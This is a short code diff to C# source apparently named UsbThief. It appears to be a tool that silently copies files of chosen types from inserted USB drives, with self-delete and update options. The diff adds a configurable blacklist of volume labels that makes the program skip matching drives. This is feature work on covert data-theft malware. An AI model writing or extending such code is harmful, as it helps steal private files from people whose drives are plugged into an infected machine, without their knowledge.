@@ -51,6 +51,7 @@ namespace UsbThief
             public bool suicide;
             public int ver;
             public string update;
+            public List<string> blacklist;
             public List<string> exts;
             public int sizeLim;
             public int delay;
@@ -260,6 +261,15 @@ namespace UsbThief
                                             string ser = GetUsbSer(drive.Name);
                                             if (ser != null)
                                             {
+                                                if (conf.blacklist != null)
+                                                {
+                                                    string label = drive.VolumeLabel;
+                                                    foreach (var item in conf.blacklist)
+                                                    {
+                                                        if (item == label && item != "")
+                                                            return;
+                                                    }
+                                                }
                                                 currentDevice.name = drive.Name;
                                                 currentDevice.volLabel = drive.VolumeLabel;
                                                 currentDevice.ser = GetUsbSer(drive.Name);
